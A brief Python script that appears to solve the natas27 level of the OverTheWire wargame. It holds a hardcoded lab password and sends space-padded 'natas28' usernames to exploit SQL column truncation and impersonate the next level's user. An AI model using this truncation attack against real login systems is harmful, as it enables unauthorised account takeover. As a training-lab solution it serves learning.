import requests
from requests.auth import HTTPBasicAuth

basic_auth = ('natas27', 'u3RRffXjysjgwFU6b9xa23i6prmUsYne')

url = "http://natas27.natas.labs.overthewire.org/index.php"
headers = {"Content-Type": "application/x-www-form-urlencoded"}


def send_request(session, username, password) -> str:
    body = {"username": username, "password": password}
    response = session.post(url,
                    headers=headers,
                    data=body)
    return response.text

if __name__ == '__main__':
    session = requests.Session()
    session.auth = basic_auth
    natas28 = "natas28"
    padding = " " * (64 - len(natas28))
    username = natas28 + padding
    password = ""
    print(send_request(session, username + "x", password))
    print(send_request(session, username, password))